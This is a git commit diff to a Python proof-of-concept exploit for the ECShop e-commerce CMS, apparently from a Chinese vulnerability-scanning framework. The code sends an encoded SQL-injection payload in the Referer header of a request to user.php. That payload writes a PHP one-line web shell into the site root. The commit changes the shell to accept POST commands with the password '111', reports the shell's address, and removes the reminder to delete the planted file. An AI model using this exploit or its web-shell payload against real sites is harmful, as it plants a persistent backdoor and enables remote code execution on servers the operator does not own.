8fa07eba0040b2646f481640195631ff5b74a3cd
Apri <likeruizi@gmail.com>
2018-09-11 21:49:19 +0800

    pocs: Fix Ecshop_0007.py

--- pocs/cms/Ecshop/ECShop_0007.py
+++ pocs/cms/Ecshop/ECShop_0007.py
@@ -68,15 +68,14 @@ class Poc(ABPoc):
                 'Referer': refer
             }
 
-            url_paylpad = self.target+"/user.php?act=login"
+            url_paylpad = self.target + "/user.php?act=login"
             r = requests.get(url_paylpad,headers=headers)
             self.output.info("正在验证...")
-            poc_url = self.target+filename_poc
+            poc_url = self.target + filename_poc
             r2 = requests.get(poc_url)
             if 'wss' in r2.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
-                self.output.info("已经网站根目录生成%s文件,请及时删除"%filename_poc)
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
@@ -92,28 +91,27 @@ class Poc(ABPoc):
             randstr = chr(random.randint(96, 122))
 
             filename_poc = randstr + '.php'
-            print(filename_poc)
-            payload = "file_put_contents('{filename}','<?php eval($_GET[wss]); ?>')".format(filename=filename_poc)
+            payload = "file_put_contents('{filename}','<?php eval($_POST[111]); ?>')".format(filename=filename_poc)
             self.output.info("随机payload生成成功")
             payload_base64 = '''{$asd'];assert(base64_decode('%s'));//}xxx''' %base64.b64encode(payload.encode('utf-8')).decode('ascii')
             self.output.info("使用Base64加密payload")
             payload_hex = binascii.b2a_hex(payload_base64.encode('utf-8')).decode('ascii')
             self.output.info("使用十六进制加密payload")
-            refer = '''554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x%s,10-- -";s:2:"id";s:3:"'/*";}'''%payload_hex
+            refer = '''554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x%s,10-- -";s:2:"id";s:3:"'/*";}''' % payload_hex
             headers = {
                 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
                 'Referer': refer
             }
 
-            url_paylpad = self.target+"/user.php?act=login"
+            url_paylpad = self.target + "/user.php?act=login"
             r = requests.get(url_paylpad,headers=headers)
             self.output.info("正在进行漏洞利用...")
-            poc_url = self.target+filename_poc+'?wss=echo md5(c);'
-            r2 = requests.get(poc_url)
+            poc_url = self.target + filename_poc
+            post_data = {"111": "echo md5(c);"}
+            r2 = requests.post(poc_url, data=post_data)
             if '4a8a08f09d37b73795649038408b5f33' in r2.text:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
-                self.output.info("已经网站根目录生成%s一句话木马，密码为 wss,请及时删除"%filename_poc)
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞，webshell地址：{webshell}，密码：111'.format(
+                        target=self.target, name=self.vuln.name, webshell=self.target + filename_poc))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
